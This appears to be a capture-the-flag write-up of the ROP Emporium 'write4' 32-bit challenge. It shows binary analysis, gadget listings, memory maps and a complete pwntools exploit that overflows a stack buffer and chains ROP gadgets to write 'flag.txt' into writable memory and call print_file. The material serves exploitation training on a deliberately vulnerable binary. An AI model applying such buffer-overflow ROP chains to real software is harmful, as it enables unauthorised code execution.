
# goal
On completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string "/bin/cat flag.txt" **is not present this time**. Although you'll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we'll stick to the challenge goal which is learning **how to get data into the target process's virtual address space via the magic of ROP**.

# analyze

```shell
➜  x86 file ./write432 
./write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped
➜  x86 checksec write432 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/write4/x86/write432'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    '.'
    Stripped:   No
```

**IDA file:libwrite432.so**
```c
int pwnme()
{
  char s[36]; // [esp+0h] [ebp-28h] BYREF

  setvbuf(stdout, 0, 2, 0);
  puts("write4 by ROP Emporium");
  puts("x86\n");
  memset(s, 0, 0x20u);
  puts("Go ahead and give me the input already!\n");
  printf("> ");
  read(0, s, 0x200u);                           // overflow vuln, offset 28h+4 = 44 
  return puts("Thank you!");
}
```


**gadget about write memory by registers**
```shell
➜  x86 ROPgadget --binary ./write432 --only "mov|ret"         
Gadgets information
============================================================
0x080484e7 : mov al, byte ptr [0xc9010804] ; ret
0x08048543 : mov dword ptr [edi], ebp ; ret     # useful
0x08048381 : mov ebx, 0x81000000 ; ret
0x08048423 : mov ebx, dword ptr [esp] ; ret
0x08048386 : ret
0x0804849e : ret 0xeac1

Unique gadgets found: 6

➜  x86 ROPgadget --binary ./write432 --only "pop|ret" 
Gadgets information
============================================================
0x080485ab : pop ebp ; ret
0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804839d : pop ebx ; ret
0x080485aa : pop edi ; pop ebp ; ret        # this
0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
0x08048386 : ret
0x0804849e : ret 0xeac1

Unique gadgets found: 7
```

**writable memory in process**
```shell
gdb-peda$ vmmap 
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/write4/x86/write432
0x08049000 0x0804a000 r--p      /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/write4/x86/write432
0x0804a000 0x0804b000 rw-p (*)  /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/write4/x86/write432  # target memory
0xf7dfe000 0xf7dff000 rw-p      mapped
0xf7dff000 0xf7faf000 r-xp      /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb0000 ---p      /lib/i386-linux-gnu/libc-2.23.so
0xf7fb0000 0xf7fb2000 r--p      /lib/i386-linux-gnu/libc-2.23.so
0xf7fb2000 0xf7fb3000 rw-p      /lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb6000 rw-p      mapped
0xf7fd0000 0xf7fd1000 r-xp      /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/write4/x86/libwrite432.so
0xf7fd1000 0xf7fd2000 r--p      /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/write4/x86/libwrite432.so
0xf7fd2000 0xf7fd3000 rw-p      /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/write4/x86/libwrite432.so
0xf7fd3000 0xf7fd4000 rw-p      mapped
0xf7fd4000 0xf7fd7000 r--p      [vvar]
0xf7fd7000 0xf7fd9000 r-xp      [vdso]
0xf7fd9000 0xf7ffc000 r-xp      /lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r--p      /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p      /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rw-p      [stack]
```

**weapon function**
```shell
➜  x86 objdump -D write432| grep "print_file"
 8048395:       e8 46 00 00 00          call   80483e0 <print_file@plt+0x10>
080483d0 <print_file@plt>:
 8048538:       e8 93 fe ff ff          call   80483d0 <print_file@plt>
```


# exploit

```python
from pwn import *

pipe = process("./write432", env={"LD_PRELOAD":"libwrite432.so"})


print_file = 0x080483d0
gadget1 = 0x080485aa    # pop edi ; pop ebp ; ret
gadget2 = 0x08048543    # mov dword ptr [edi], ebp ; ret
target_mem = 0x0804af00

chain = "A" * 44
chain += p32(gadget1)
chain += p32(target_mem)
chain += b'flag'
chain += p32(gadget2)

chain += p32(gadget1)
chain += p32(target_mem+4)
chain += b'.txt'
chain += p32(gadget2)

chain += p32(print_file)
chain += p32(0xdeadbeef)
chain += p32(target_mem)

print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())
```

```shell
➜  x86 python ./exp.py
[+] Starting local process './write432': pid 61042
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> 
[*] Paused (press any to continue)
[*] Process './write432' stopped with exit code -11 (SIGSEGV) (pid 61042)
Thank you!
ROPE{a_placeholder_32byte_flag!}
```
